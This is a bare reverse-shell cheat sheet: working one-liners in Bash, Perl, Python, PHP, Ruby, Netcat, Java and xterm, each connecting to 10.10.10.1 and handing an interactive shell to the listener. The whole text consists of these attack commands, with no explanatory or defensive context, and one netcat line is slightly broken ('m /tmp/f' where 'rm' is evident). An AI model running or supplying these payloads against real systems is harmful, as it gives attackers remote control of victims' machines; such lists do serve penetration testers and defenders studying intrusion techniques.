#Bash
	bash -i >& /dev/tcp/10.10.10.1/8080 0>&1
#PERL
	perl -e 'use Socket;$i="10.10.10.1";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
#Python
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#PHP
	php -r '$sock=fsockopen("10.10.10.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
#Ruby
	ruby -rsocket -e'f=TCPSocket.open("10.10.10.1",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
#Netcat
	nc -e /bin/sh 10.10.10.1 1337
	m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 1337 >/tmp/f
#Java
	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5;done"] as String[])
	p.waitFor()
#xterm
	xterm -display 10.10.10.1:1
